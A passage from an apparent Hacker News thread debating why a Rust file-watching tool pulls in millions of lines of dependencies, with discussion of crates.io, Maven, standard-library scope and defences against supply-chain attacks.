is using only a sliver of it in the case it's built for windows. The standard library for pretty much any language will have millions of lines of code, that's not scary even though your apps likely only use a fraction of what's offered. And have you ever glanced at C++'s boost library? That thing is monstrously big yet most devs using it are going to really only grab a few of the extensions. The alternative is the npm hellscape where you have a package for \"isOdd\" and a package for \"is even\" that can break the entire ecosystem if the owner is disgruntled because everything depends on them. Having fewer larger dependencies maintained and relied on by multiple people is much more ideal and where rust mostly finds itself. reply throwitaway1123 38 minutes agorootparent> The alternative is the npm hellscape where you have a package for \"isOdd\" and a package for \"is even\" that can break the entire ecosystem if the owner is disgruntled because everything depends on them. The is-odd and is-even packages are in no way situated to break the ecosystem. They're helper functions that their author (Jon Schlinkert) used as dependencies in one of his other packages (micromatch) 10 years ago, and consequently show up as transitive dependencies in antiquated versions of micromatch. No one actually depends on this package indirectly in 2024 (not even the author himself), and very few packages ever depended on it directly. Micromatch is largely obsolete given the fact that Node has built in globbing support now [1][2]. We have to let some of these NPM memes go. [1] https://nodejs.org/docs/latest-v22.x/api/path.html#pathmatch... [2] https://nodejs.org/docs/latest-v22.x/api/fs.html#fspromisesg... reply preommr 6 hours agorootparentprev> The alternative is the npm hellscape where you have a package for \"isOdd\" and a package for \"is even\" that can break the entire ecosystem if the owner is disgruntled because everything depends on them. This used to be true 5-10 years ago. The js ecosystem moves fast and much has been done to fix the dependency sprawl. reply dartos 6 hours agorootparentI… don’t think that’s true. Just look at how many downloads some of those packages have today. Look at the dependency tree for a next or nuxt app. What the js world did is make their build systems somewhat sane, whatwith not needing babel in every project anymore. reply throwitaway1123 1 hour agorootparent> Look at the dependency tree for a next Looks ok to me: https://npmgraph.js.org/?q=next Ironically, most of the dependencies are actually Rust crates used by swc and turbopack [1]. Try running cargo tree on either of those crates, it's enlightening to say the least. And of course, Node has a built in file watcher, and even the most popular third party package for file watching (Chokidar) has a single dependency [3]. [1] https://github.com/vercel/turborepo/blob/main/Cargo.toml [2] https://github.com/swc-project/swc/blob/main/Cargo.toml [3] https://npmgraph.js.org/?q=chokidar reply DanielHB 12 hours agoparentprevThe fact is that dependency jungle is the prevalent way to get shit done these days. The best the runtime can do is embrace it, make it as performant and safe as possible and try to support minimum-dependency projects by having a broad std library. Also I am no expert, but I think file-watchers are definitely not simple at all, especially if they are multi-platform. reply kreyenborgi 11 hours agorootparenthttps://github.com/eradman/entr is Language files blank comment code ------------------------------------------------------------------------------- C 4 154 163 880 Bourne Shell 2 74 28 536 C/C++ Header 4 21 66 70 Markdown 1 21 0 37 YAML 1 0 0 14 ------------------------------------------------------------------------------- SUM: 12 270 257 1537 ------------------------------------------------------------------------------- including a well-designed CLI. entr supports BSD, Mac OS, and Linux (even WSL). So that's several platforms init's just a fixed unconditional terminal sequence Are you referring to the clear feature? Yes, it's fixed. It's also pretty standard in that regard. It's optional so if it breaks (probably on xterm because it's weird but that's about it) you don't have to use it and can just issue a clear command manually as part of whatever you're running in the TTY it gives you. Honestly I don't think the feature is even really needed. I highly doubt cargo-watch needs to do anything with TERM so I am not sure why you mention it (spamming colours everywhere is eye candy not a feature). But more importantly, this is just a convenience feature and not part of the \"CLI\". Not supporting long options isn't indicative of a poorly designed CLI. However, adding long option support without any dependencies is only a couple of hundred lines of C. > And cargo-watch actually parses the `cargo metadata` JSON output Which is unnecessary and entirely cargo specific. Meanwhile you can achieve the same effect with entr by just chaining it with an appropriate jq invocation. entr is more flexible by not having this feature. > (guess what's required for parsing JSON in C) Not really anywhere near as many lines as you seem to think. > deals with ignore patterns which are consistent in syntax (guess what's required for doing that besides from fnmatch). Again, entr doesn't deal with ignore patterns because it allows the end user to decide how to handle this themselves. It takes a list of filenames via stdin. This is not a design problem, it's just a design choice. It makes it more flexible. But again, if you wanted to write this in C, it's only another couple of hundred lines. From my experience doing windows development, windows support probably isn't as painful as you seem to think. All in all, I imagine it would take under 10k to have all the features you seem to care about AND nothing non-eye-candy would have to be cut (although for the eye candy, it's not exactly hideously difficult to parse terminfo. the terminfo crate for rust is pretty small (3.2k SLOC) and it would actually be that small (or smaller) if it didn't over-engineer the fuck out of the problem by using the nom, fnv, and phf crates given we're parsing terminfo not genetic information and doing it once at program startup not 10000 times per second). Yes, I think trying to golf the problem is probably not appropriate. But 4M LoC is fucking ridiculous by any metric. 1M would still be ridiculous. 100k would also be ridiculous 50k is still pretty ridiculous. reply lifthrasiir 8 hours agorootparent> There's no standard way of doing file watching across BSDs, Mac OS and Linux. You are correct, but that's about the only divergence matters in this context. As I've noted elsewhere, you can't even safely use `char*` for file names in Windows; it should be `wchar_t*` in order to avoid any encoding problem. > Are you referring to the clear feature? Yes, it's fixed. It's also pretty standard in that regard. At the very least it should have checked for TTY in advance. I'm not even interested in terminfo (which should go die). > spamming colours everywhere is eye candy not a feature Agreed that \"spamming\" is a real problem, provided that you don't treat any amount of color as spamming. > Which is unnecessary and entirely cargo specific. Meanwhile you can achieve the same effect with entr by just chaining it with an appropriate jq invocation. entr is more flexible by not having this feature. Cargo-watch was strictly designed for Cargo users, which would obviously want to watch some Cargo workspace. Entr just happens to be not designed for this use case. And jq is much larger than entr, so you should instead consider the size of entr + jq by that logic. > Not really anywhere near as many lines as you seem to think. Yeah, my estimate is about 300 lines of code with a carefully chosen set of interface. But you have to ensure that it is indeed correct yourself, and JSON is already known for its sloppily worded standard and varying implementation [1]. That's what is actually required. [1] https://seriot.ch/projects/parsing_json.html > Yes, I think trying to golf the problem is probably not appropriate. But 4M LoC is fucking ridiculous by any metric. 1M would still be ridiculous. And that 4M LoC is fucking ridiculous because it includes all `#[cfg]`-ignored lines in various crates including most of 2.2M LoC in the `windows` crate. That figure is just fucking incorrect and not relevant! > 100k would also be ridiculous 50k is still pretty ridiculous. And for this part, you would be correct if I didn't say the \"faithful\" reproduction. I'm totally sure that some thousand lines of Rust code should be enough to deliver a functionally identical program, but that's short of the faithful reproduction. This faithfulness issue actually occurs in many comparisons between Rust and C/C++; even the simple \"Hello, world!\" program does a different thing in Rust and in C because Rust panics when it couldn't write the whole text for example. 50K is just a safety margin for such subtle differences. (I can for example imagine some Unicode stuffs around...) reply Arch-TK 3 hours agorootparent> As I've noted elsewhere, you can't even safely use `char` for file names in Windows; it should be `wchar_t` in order to avoid any encoding problem. Yes, this is true. But I think the overhead of writing that kind of code would not be as enormous as 30k lines or anything in that order. > At the very least it should have checked for TTY in advance. I'm not even interested in terminfo (which should go die). Maybe. It's an explicit option you must pass. It's often useful to be able to override isatty decisions when you want to embed terminal escapes in output to something like less. But for clear it's debatable. I would say it's fine as it is. Also, if isatty is \"the very least\" what else do you propose? > Agreed that \"spamming\" is a real problem, provided that you don't treat any amount of color as spamming. I treat any amount of color as spamming when alternative options exist. Colours are useful for: syntax highlighting, additional information from ls. Not for telling you that a new line of text is available for you to read in your terminal. There are many things where colours are completely superfluous but are not over-used. I still think that colours should be the exception not the rule. > Cargo-watch was strictly designed for Cargo users, which would obviously want to watch some Cargo workspace. Entr just happens to be not designed for this use case. And jq is much larger than entr, so you should instead consider the size of entr + jq by that logic. Yes jq is larger than entr. But it's not 3.9M SLOC. It also has many features that cargo-watch doesn't. If you wanted something cargo specific you could just write something specific to that in not very much code at all. The point is that the combination of jq and entr can do more than cargo-watch with less code. > and JSON is already known for its sloppily worded standard and varying implementation [1]. That's what is actually required. I hope you can agree that no number of millions of lines of code can fix JSON being trash. What would solve JSON being trash is if people stopped using it. But that's also not going to happen. So we are just going to have to deal with JSON being trash. > And for this part, you would be correct if I didn't say the \"faithful\" reproduction. I'm totally sure that some thousand lines of Rust code should be enough to deliver a functionally identical program, but that's short of the faithful reproduction. This faithfulness issue actually occurs in many comparisons between Rust and C/C++; even the simple \"Hello, world!\" program does a different thing in Rust and in C because Rust panics when it couldn't write the whole text for example. 50K is just a safety margin for such subtle differences. (I can for example imagine some Unicode stuffs around...) Regardless of all the obstacles. I put my money on 20k max in rust with everything vendored including writing your own windows bindings. But neither of us has time for that. reply kreyenborgi 7 hours agorootparentprevGood argument. I do prefer bicycles. reply gpderetta 9 hours agorootparentprev> BSD, Mac OS and Linux Do these OSs share file watch interfaces? Linux itself has, last I checked, three incompatible file watch APIs. reply lifthrasiir 8 hours agorootparentHence \"variants\". Many other aspects, including the very fact that you can safely use `char*` for the file name, are shared. reply ben-schaaf 10 hours agorootparentprevNote that entr doesn't recursively watch for file changes. It has a list of files it watches for changes, but this list isn't amended when new files are added. Fundamentally that's a fairly small subset of proper recursive file watching. In terms of just watching files a better project to compare against is https://github.com/inotify-tools/inotify-tools. reply kreyenborgi 7 hours agorootparentfrom man entr: Rebuild project if a source file is modified or added to the src/ di‐ rectory: $ while sleep 0.1; do ls src/*.rbentr -d make; done Though I shudder to think of the amount of code needed to rewrite that in a compiled language while sticking to the principle of not reinventing anything remotely wheel-shaped. (Btw the libinotify/src is like 2.3kloc, inotify cliBy using MATHEMATICS and EXTRAPOLATION we find that non-WSL Windows file-watching must take four million minus two thousand equals calculate calculate 3998000 lines of code You joke, but Windows support is the main (probably the only?) reason why cargo-watch is huge. Rust ecosystem has some weird shit when interacting with Windows. reply dist1ll 11 hours agorootparentprevThat's the usual response I get when I bring this issue up. \"file watching is actually very complicated\" or \"if you avoided deps, you'd just reimplement millions of loc yourself. Forgive me if I'm making a very bold claim, but I think cross-platform file watching should not require this much code. It's 32x larger than the Linux memory management subsystem. reply joatmon-snoo 11 hours agorootparentGood file watching that provides flexible primitives absolutely requires: - ok, a single ext4 file inode changes, and its filename matches my hardcoded string - oh, you don’t want to match against just changes to “package.json” but you want to match against a regex? voila, now you need a regex engine - what about handling a directory rename? should that trigger matches on all files in the renamed directory? - should the file watcher be triggered once per file, or just every 5ms? turns out this depends on your use case - how do symlinks fit into this story? - let’s say i want to handle once every 5ms- how do i actually wait for 5ms? do i yield the thread? do i allow other async contexts to execute while i’m waiting? how do those contexts know when to execute and when to yield back to me? now you have an async runtime with timers - how does buffering work? are there limits on how many file change events can be buffered? do i dynamically allocate more memory as more file changes get buffered? now you need a vector/arraylist implementation And this is before you look at what this looks like on different platforms, or if you want polling fallbacks. Can you do it with less dependencies? Probably, if you start making hard tradeoffs and adding even more complexity about what features you activate - but that only adds lines of code, it doesn’t remove them. What you describe is ideologically nice, but in practice it’s over-optimizing for a goal that most people don’t really care about. reply varjag 10 hours agorootparentAre you 100% sure all these cases are handled by cargo-watch? reply cogman10 7 hours agorootparentYup. Every user facing case mentioned has a corresponding flag. The non-user facing stuff, like being cross platform, is common sense. https://crates.io/crates/cargo-watch/8.5.2 reply lostmsu 9 hours agorootparentprevRegex one stands out as a negative example here. Why does it have to be built-in instead of exposing a str -> bool filter lambda? reply sethaurus 2 hours agorootparentHow does one pass a lambda to a CLI tool? Outside of using a regex or equivalent pattern syntax, I'm struggling to understand what you are proposing here. reply lostmsu 30 minutes agorootparentThis is in a context of file watching library. Although I'm not sure cargo-watch supports or even needs to support regex. reply mirashii 9 hours agorootparentprevNow you need a general purpose embedded language interpreter to express your filter lambda? I'm not sure you've really made anything simpler. reply rowanG077 7 hours agorootparentI don't see why you want an embedded interpreter for this. Can you explain? reply tempodox 2 hours agorootparentIf you give a lambda to cargo-watch instead of a regexp, it has to be evaluated. Hence interpreter. reply rowanG077 1 hour agorootparentWhy would you evaluate it using an interpreter? Since you are using it in the context of a rust lambda you compile it. You just have a rust file that calls cargo-watch as a library. Crafting an interpreter seems like an incredibly bad idea. reply mirashii 4 minutes agorootparentBut now you have to know at compile time what you're watching, which is not what cargo-watch or any of the similar commands like entr do. SkiFire13 11 hours agorootparentprevIt's not just file watching, that would be the watchexec crate, while cargo-watch properly integrate with cargo. Moreover cargo-watch also includes: - proper CLI support, with help messages, subcommands and so on - support for reading cargo's metadata - logging - support for dotenv files - proper shell escaping support - and it seems also support for colored terminal writing. Moreover both watchexec and cargo-watch end up depending on winapi, which includes binding for a lot of windows API, some which might be needed and some which not be. This could also be worse if the offial windows crate by Microsoft was used (or maybe it's already used due to some dependency, I haven't checked), since that's gigantic. reply DanielHB 11 hours agorootparentprevI think the issue of file-watching is that the libs usually support multiple implementations (with different tradeoffs and with multiple fallbacks) for file-watching with a lot of them being platform specific. reply j-krieger 11 hours agorootparentprevEh. The standard library is also a gigantic dependency written entirely by volunteers. reply DanielHB 11 hours agorootparentI am not a Rust expert but the thing with the standard libraries is that it only has peer dependencies with itself and they are all synced to the same version. Meaning if you only use the std lib you: 1) Will never include two different versions of the same peer dependency because of incompatible version requirements. 2) Will usually not have two dependencies relying on two different peer-dependencies that do the same thing. This can still happen for deprecated std lib features, but tends to be a much lesser issue. These two issues are usually the ones that cause dependency size explosion in projects. reply dist1ll 11 hours agorootparentprevI don't have a problem with dependencies in principle. There's a good reason for standard libraries to contain a decent amount of code. It is a vector for supply chain attacks, but I also have a lot of trust in the Rust maintainers. The Rust standard library is exceptionally well-written from what I've seen, so I'm not too worried about it. FWIW I checked out the nightly toolchain, and it looks like the stdlib is less than 400k SLoC. So literally 10x smaller. reply SkiFire13 11 hours agorootparentprev> try to support minimum-dependency projects by having a broad std library. Since everyone depends on the standard library this will just mean everyone will depend on even more lines of code. You are decreasing the number of nominal dependencies but increasing of much code those amount to. Moreover the moment the stdlib's bundled dependency is not enough there are two problems: - it can't be changed because that would be a breaking change, so you're stuck with the old bad implementation; - you will have to use an alternative implementation in another crate, so now you're back at the starting situation except with another dependency bundled in the stdlib. Just look at the dependency situation with the python stdlib, e.g. how many versions of urllib there are. reply DanielHB 11 hours agorootparentYou do have good points as well and it depends heavily on how disciplined the std lib makers are. Go for example has a very clean and stable std lib. I posted this in some other thread: I am not a Rust expert but the thing with the standard libraries is that it only has peer dependencies with itself and they are all synced to the same version. Meaning if you only use the std lib you: 1) Will never include two different versions of the same peer dependency because of incompatible version requirements. 2) Will usually not have two dependencies relying on two different peer-dependencies that do the same thing. This can still happen for deprecated std lib features, but tends to be a much lesser issue. These two issues are usually the ones that cause dependency size explosion in projects. reply SkiFire13 10 hours agorootparentFor 1), Cargo already take care of that if you use the same major version. Bundling dependencies in the stdlib \"solves\" the problem by making new major versions impossible. This means that if a bundled dependency in the stdlib is even found to have some design issue that require breaking changes to fix then you're out of luck. As you said the stdlib could deprecate the old version and add a new one, but then you're just making problem 2) worse by forcing everyone to include the old deprecated dependency too! Or you could use a third-party implementation, especially if the stdlib doesn't have the features you need, but even then you will still be including the stdlib version in your dependency graph! Ultimately IMO bundling dependencies in the stdlib just makes the problem worse over time, though it can raise awareness about how to better handle them. reply DanielHB 7 hours agorootparent> Cargo already take care of that if you use the same major version. Most dependency management systems do that, but large projects often end up pulling multiple different major versions of (often very large) dependencies. > 2) worse by forcing everyone to include the old deprecated dependency too! Like I said I am no expert on Rust, but I assume that Rust can eliminate stdlib dead-code from the runtime? So unused deprecated features shouldn't be included on every build? Also deprecated features often are modified to use the new implementation under the hood which reduces code duplication problem. > Bundling dependencies in the stdlib \"solves\" the problem by making new major versions impossible. Yes, which is a feature. For example Go is very annoying about this not only on the stdlib. https://go.dev/doc/go1compat a lot of 3rd party libs follow this principle as well. I bring Go a lot but I actually don't like the language that much, but it gets some pragmatic things right. I am not saying everything should be in the stdlib, but I tend to think that the stdlib should be fairly big and tackle most common problems. reply SkiFire13 5 hours agorootparent> > Bundling dependencies in the stdlib \"solves\" the problem by making new major versions impossible. > > Yes, which is a feature. For example Go is very annoying about this not only on the stdlib. https://go.dev/doc/go1compat a lot of 3rd party libs follow this principle as well. But there's no reason such a \"feature\" requires bundling dependencies in the stdlib. As you mention 3rd party Go libs manage to do this perfectly fine. > but I tend to think that the stdlib should be fairly big and tackle most common problems. I tend to disagree with this, because the way to tackle those common problems with likely change in the future, but the stdlib will be stuck with it for eternity. I would rather have some community-standard 3rd party crate that you can replace in the future when it will grow old. See also \"Where modules go to die\" https://leancrew.com/all-this/2012/04/where-modules-go-to-di... reply norman784 9 hours agorootparentprevI would argue that Go is focused on writing web services and their stdlib is focused on providing those primitives. On the other hand Rust is more general programming language, so it's harder to add something to the stdlib that would not benefit the broader range of users. reply chillfox 11 hours agorootparentprev\"I think file-watchers are definitely not simple at all\" I don't really know much about Rust, but I got curious and had a look at the file watching apis for windows/linux/macos and it really didn't seem that complicated. Maybe a bit fiddly, but I have a hard time imagining how it could take more than 500 lines of code. I would love to know where the hard part is if anyone knows of a good blog post or video about it. reply 0x000xca0xfe 5 hours agorootparentprevIf you lose track of your dependencies you are just asking for supply chain attacks. And since xz we know resourceful and patient attackers are reality and not just \"it might happen\". Sorry but sprawling transitive micro-dependencies are not sustainable. It's convenient and many modern projects right now utilize it but they require a high-trust environment and we don't have that anymore, unfortunately. reply lifthrasiir 11 hours agoparentprevI consciously remove and rewrite various dependencies at work, but I feel it's only a half of the whole story because either 1K or 4M lines of code seem to be equally inaccurate estimates for the appropriate number of LoC for this project. It seems that most dependencies of cargo-watch are pulled from three direct requirements: clap, cargo_metadata and watchexec. Clap would pull lots of CLI things that would be naturally platform-dependent, while cargo_metadata will surely pull most serde stuffs. Watchexec does have a room for improvement though, because it depends on command-group (maintained in the same org) which unconditionally requires Tokio! Who would have expected that? Once watchexec got improved on that aspect however, I think these requirements are indeed necessary for the project's goal and any further dependency removal will probably come with some downsides. A bigger problem here is that you can't easily fix other crates' excessive dependencies. Watchexec can be surely improved, but what if other crates are stuck at the older version of watchexec? There are some cases where you can just tweak Cargo.lock to get things aligned, but generally you can't do that. You have to live with excessive and/or duplicate dependencies (not a huge problem by itself, so it's default for most people) or work around with `[patch]` sections. (Cargo is actually in a better shape given that the second option is even possible at all!) In my opinion there should be some easy way to define a \"stand-in\" for given version of crate, so that such dependency issues can be more systematically worked around. But any such solution would be a huge research problem for any existing package manager. reply cmrdporcupine 10 hours agorootparentIt's frustrating because the grand-daddy of build systems with automatic transitive dependency management -- Maven -- already had tools from day one to handle this kind of thing through excluded dependencies (a blunt instrument, but sometimes necessary). In my experience, [patch] doesn't cut it or compare. That, and the maven repository is moderated. Unlike crates.io. Crates.io is a real problem. No namespaces, basically unmoderated, tons of abandoned stuff. Version hell like you're talking about. I have a hard time taking it at all seriously as a professional tool. And it's only going to get worse. If I were starting a Rust project from scratch inside a commercial company at this point, I'd use Bazel or Buck or GN/Ninja and vendored dependencies. No Cargo, no crates.io. reply lifthrasiir 9 hours agorootparent> In my experience, [patch] doesn't cut it or compare. AFAIK what Maven does is an exclusion of dependency edges, which is technically an unsafe thing to do. Cargo [patch] is a replacement of dependency vertices without affecting any edges. (Maven surely has a plugin to do that, but it's not built-in.) They are different things to start with. Also I believe that the edge exclusion as done by Maven is (not just \"technically\", but) really unsafe and only supported due to the lack of better alternatives. Edges are conceptually dependent to the incoming vertex, so it should be that vertex's responsibility to override problematic edges. An arbitrary removal of edges (or vertices) is much harder to track and many other systems have related pains from that. What I'm proposing here is therefore the extension of Cargo's vertex replacement: you should be able to share such replacements so that they can be systematically dealt. If my transitive dependencies contain some crate X with two different versions 1.0 and 2.0 (say), I should be able to write an adapter from 2.0 to 1.0 or vice versa, and ideally such adapter should be available from the crate author or from the community. I don't think Maven did try any such systematic solution. > That, and the maven repository is moderated. Unlike crates.io. Only the central repository is moderated by Maven. Maven is not much better than Cargo once you have more remote repositories. > Crates.io is a real problem. No namespaces, basically unmoderated, tons of abandoned stuff. Version hell like you're talking about. Namespace is not a solution for name squatting: namespace is just yet another identifier that can be squatted. If you are worried about squatting, the only effective solution is sandboxing, everything else is just moving the goal post. The very existence of remote repositories also means that you can't always moderate all the stuffs and get rid of abandoned stuffs. You have to trust repositories, just like that you have to trust crates with crates.io today. reply pas 8 hours agorootparentnamespaces are a solution to having \"authenticated groups of crates\", it helps structuring and more importantly restructuring crates. reply lifthrasiir 8 hours agorootparentThat's an intention, not the outcome. You might assume that having both `@chrono/chrono` and `@chrono/tz` shows a clear connection between them, but such connection is nothing to do with namespace (the actual crate names are `chrono` and `chrono-tz`), and any authority provided by `@chrono/` prefix is offseted by the availability of similar names like `@chrno/tz` or `chrono-tz`. The only thing namespace can prevent is names starting with the exact prefix of `@chrono/`, and that's not enough. reply pas 6 hours agorootparent\"... any authority provided by [a] prefix is offseted by the availability of [similar prefixes]\" I'm not buying this, sorry. Yes, typos and other deceptive things are possible, but having this authority data would allow tools to then use this signal. Not having it seems strictly worse. reply simon_o 7 hours agorootparentprev> Namespace is not a solution for name squatting: namespace is just yet another identifier that can be squatted. If you are worried about squatting, the only effective solution is sandboxing, everything else is just moving the goal post. The problems crates.io struggles with have never been an issue with Maven, regardless of how creatively you try to redefine words. That's a fact. Deal with it. reply lifthrasiir 6 hours agorootparentHow can you be that sure? :-) It is not even like that Maven repositories don't suffer from malicious packages with confusing names (for example, [1])... [1] https://github.com/spring-projects/spring-ai/issues/537 reply simon_o 6 hours agorootparentThat seems to be an absolute win to be honest. Not sure how you think this is helping your case. Maven Central people nuked the artifact that may have caused confusion, and if the owners try anything like that again, it's likely their domain will be banned from publishing. reply dartos 6 hours agorootparentprevOnly sith speak in absolutes. reply conradludgate 12 hours agoparentprevI bet most of those lines are from the generated windows api crates. They are notoriously monstrous reply dist1ll 12 hours agorootparentYou're right, the windows crate alone contributes 2.2M. I wonder if there's a way to deal with this issue. reply lifthrasiir 11 hours agorootparentThe exact size of the `windows` crate depends on feature flags, because parsing 2.2M lines of code is always going to be very expensive even when you immediately discard them. reply JoshTriplett 11 hours agorootparentThe parser is shockingly fast. The slow parts come after parsing, where we process all those function definitions and structure definitions, only to end up throwing 98% of them away. A challenging architectural problem that several of us are trying to get someone nerdsniped into: inverting the dependency tree, such that you first check what symbols exist in a large crate like windows, then go to all the crates depending on it and see what they actually consume, then go back and only compile the bits needed for those symbols. That'd be a massive improvement to compilation time, but it's a complicated change. You'd have to either do a two-pass compilation (first to get the symbol list, then again to compile the needed symbols) or leave that instance of the compiler running and feed the list of needed symbols back into it. reply lifthrasiir 11 hours agorootparentAgreed, though by \"parsing\" I meant to include easy steps like cfg checks. In fact, cfg checks should probably be done at the same time as parsing and disabled items should be discarded as soon as possible---though I don't know whether that is already done in the current compiler, or whether it's beneficial or even possible at all. reply JoshTriplett 11 hours agorootparentWe do some parsing \"underneath\" disabled cfg checks, in order to support user-friendliness features like \"that function you tried to call doesn't exist, but if you enabled feature xyz then it would\". But we do discard cfg-protected items before doing any subsequent heavier operations. reply Flex247A 11 hours agorootparentprevEnabling FAT LTO reduces the final binary size but it isn't a permanent fix. reply actionfromafar 11 hours agorootparentNot permanent how? reply Flex247A 2 hours agorootparentBecause the compiler ends up looking at all the functions anyway, only for the linker to discard them all. reply jeroenhd 8 hours agorootparentprevI love and hate the Windows API crates. They're amazing in that they bring pretty much the entire modern Windows API into the language without needing to touch FFI generators yourself, but the Windows API is about as large as almost every package that comes with a desktop Linux install. I wish crates that used Windows stuff wouldn't enable it by default. reply lifthrasiir 8 hours agorootparentWell, they do! What happens here is that `windows` crates are lightly processed even when they are disabled, for the reason JoshTriplett mentioned elsewhere. Such \"light\" processing is negligible in practice, but technically all those lines are processed (and `Cargo.lock` will list them even when they are entirely unused), hence the overblown and extremely misleading figure. reply nullifidian 11 hours agoparentprevSome amount of the risk from the \"dependency jungle\" situation could be alleviated by instituting \"trusted\" set of crates that are selected based on some popularity threshold, and with a rolling-release linux-distro-like stabilization chain, graduating from \"testing\" to \"stable\". If the Rust Foundation raised more money from the large companies, and hired devs to work as additional maintainers for these key crates, adding their signed-offs, it would be highly beneficial. That would have been a naturally evolving and changing equivalent to an extensive standard library. Mandating at least two maintainer sign offs for such critical set of crates would have been a good policy. Instead the large companies that use rust prefer to vet the crates on their own individually, duplicating the work the other companies do. The fact that nothing has changed in the NPM and Python worlds indicates that market forces pressure the decision makers to prefer the more risky approach, which prioritizes growth and fast iteration. reply tbillington 10 hours agoparentprevvendor + linecount unfortunately doesn't represent an accurate number of what cargo-watch would actually use. It includes all platform specific code behind compile time toggles even though only one would be used at any particular time, and doesn't account for the code not included because the feature wasn't enabled. https://doc.rust-lang.org/cargo/reference/features.html whether those factors impact how you view the result of linecount is subjective also as one of the other commenters mentioned, cargo watch does more than just file watching reply the_clarence 1 hour agoparentprevAgree. That was always my major gripe with Rust: it's not battery included. The big selling point of golang was the battery included part and I think that's really what is missing in Rust. I hope that with time more stuff can't get into the rust stdlib reply umanwizard 11 hours agoparentprevWhy, concretely, does this matter? Other than people who care about relatively obscure concerns like distro packaging, nobody is impeded in their work in any practical way by crates having a lot of transitive dependencies. reply josephg 8 hours agorootparentAuthor here. If I compile a package which has 1000 transitive dependencies written by different authors, there's ~1000 people who can execute arbitrary code on my computer, with my full user permissions. I wouldn't even know if they did. That sounds like a massive security problem to me. All it would take is one popular crate to get hacked / bribed / taken over and we're all done for. Giving thousands of strangers the ability to run arbitrary code on my computer is a profoundly stupid risk. Especially given its unnecessary. 99% of crates don't need the ability to execute arbitrary syscalls. Why allow that by default? reply bormaj 7 hours agorootparentAre there any attempts to address this at the package management level (not a cargo-specific question)? My first thought is that the package could declare in its config file the \"scope\" of access that it needs, but even then I'm sure this could be abused or has limitations. Seems like awareness about this threat vector is becoming more widespread, but I don't hear much discuss trickling through the grapevine re: solutions. reply josephg 7 hours agorootparentNot that I know of - hence talking about it in this blog post! reply vlovich123 5 hours agorootparentPackage scope is typically too coarse - a package might export multiple different pieces of related functionality and you’d want to be able to use the “safe” parts you audited (eg no fs access) and never call the “dangerous” ones. The harder bit is annotating things - while you can protect against std::fs, it’s likely harder to guarantee that malicious code doesn’t just call syscalls directly via assembly. There’s too many escapes possible which is why I suspect no one has particularly championed this idea. reply josephg 5 hours agorootparent> it’s likely harder to guarantee that malicious code doesn’t just call syscalls directly via assembly. Hence the requirement to also limit / ban `unsafe` in untrusted code. I mean, if you can poke raw memory, the game is up. But most utility crates don't need unsafe code. > Package scope is typically too coarse - a package might export multiple different pieces of related functionality and you’d want to be able to use the “safe” parts you audited Yeah; I'm imagining a combination of \"I give these permissions to this package\" in Cargo.toml. And then at runtime, the compiler only checks the call tree of any functions I actually call. Its fine if a crate has utility methods that access std::fs, so long as they're never actually called by my program. reply vlovich123 5 hours agorootparent> Hence the requirement to also limit / ban `unsafe` in untrusted code I think you’d be surprised by how much code has a transitive unsafe somewhere in the call chain. For example, RefCell and Mutex would need unsafe and I think you’d agree those are “safe constructs” that you would want available to “utility” code that should haven’t filesystem access. So now you have to go and reenable constructs that use unsafe that should be allowed anyway. It’s a massively difficult undertaking. Having easier runtime mechanisms for dropping filesystem permissions would definitely be better. Something like you are required to do filesystem access through an ownership token that determines what you can access and you can specify the “none” token for most code and even do a dynamic downgrade. There’s some such facilities on Linux but they’re quite primitive - it’s process wide and once dropped you can never regain that permission. That’s why the model is to isolate the different parts into separate processes since that’s how OSes scope permissions but it’s super hard and a lot of boilerplate to do something that feels like it should be easy. reply josephg 4 hours agorootparent> I think you’d be surprised by how much code has a transitive unsafe somewhere in the call chain. For example, RefCell and Mutex would need unsafe and I think you’d agree those are “safe constructs” that you would want available to “utility” code that should haven’t filesystem access. So now you have to go and reenable constructs that use unsafe that should be allowed anyway. It’s a massively difficult undertaking. RefCell and Mutex have safe wrappers. If you stick to the safe APIs of those types, it should be impossible to read / write to arbitrary memory. I think we just don't want untrusted code itself using unsafe. We could easily allow a way to whitelist trusted crates, even when they appear deep in the call tree. This would also be useful for things like tokio, and maybe pin_project and others. reply pornel 6 hours agorootparentprevRust can't prevent crates from doing anything. It's not a sandbox language, and can't be made into one without losing its systems programming power and compatibility with C/C++ way of working. There are countless obscure holes in rustc, LLVM, and linkers, because they were never meant to be a security barrier against the code they compile. This doesn't affect normal programs, because the exploits are impossible to write by accident, but they are possible to write on purpose. --- Secondly, it's not 1000 crates from 1000 people. Rust projects tend to split themselves into dozens of micro packages. It's almost like splitting code across multiple .c files, except they're visible in Cargo. Many packages are from a few prolific authors and rust-lang members. The risk is there, but it's not as outsized as it seems. Maintainers of your distro do not review code they pull in for security, and the libraries you link to have their own transitive dependencies from hundreds of people, but you usually just don't see them: https://wiki.alopex.li/LetsBeRealAboutDependencies Rust has cargo-vet and cargo-crev for vetting of dependencies. It's actually much easier to review code of small single-purpose packages. reply vlovich123 5 hours agorootparentThere’s two different attack surfaces - compile time and runtime. For compile time, there’s a big difference between needing the attacker to exploit the compiler vs literally just use the standard API (both in terms of difficulty of implementation and ease of spotting what should look like fairly weird code). And there’s a big difference between runtime rust vs compile time rust - there’s no reason that cargo can’t sandbox build.rs execution (not what josephg brought up but honestly my bigger concern). There is a legitimate risk of runtime supply chain attacks and I don’t see why you wouldn’t want to have facilities within Rust to help you force contractually what code is and isn’t able to do when you invoke it as a way to enforce a top-level audit. Even though rust today doesn’t support it doesn’t make it a bad idea or one that can’t be elegantly integrated into today’s rust. reply pornel 2 hours agorootparentI agree there's a value in forcing exploits to be weirder and more complex, since that helps spotting them in code reviews. But beyond that, if you don't review the code, then the rest matters very little. Sandboxed build.rs can still inject code that will escape as soon as you test your code (I don't believe people are diligent enough to always strictly isolate these environments despite the inconvenience). It can attack the linker, and people don't even file CVEs for linkers, because they're expected to get only trusted inputs. Static access permissions per dependency are generally insufficient, because an untrusted dependency is very likely to find some gadget to use by combining trusted deps, e.g. use trusted serde to deserialize some other trusted type that will do I/O, and such indirection is very hard to stop without having fully capability-based sandbox. But in Rust there's no VM to mediate access between modules or the OS, and isolation purely at the source code level is evidently impossible to get right given the complexity of the type system, and LLVM's love for undefined behavior. The soundness holes are documented all over rustc and LLVM bug trackers, including some WONTFIXes. LLVM cares about performance and compatibility first, including concerns of non-Rust languages. \"Just don't write weirdly broken code that insists on hitting a paradox in the optimizer\" is a valid answer for LLVM where it was never designed to be a security barrier against code that is both untrusted and expected to have maximum performance and direct low-level hardware access at the same time. And that's just for sandbox escapes. Malware in deps can do damage in the program without crossing any barriers. Anything auth-adjacent can let an attacker in. Parsers and serializers can manipulate 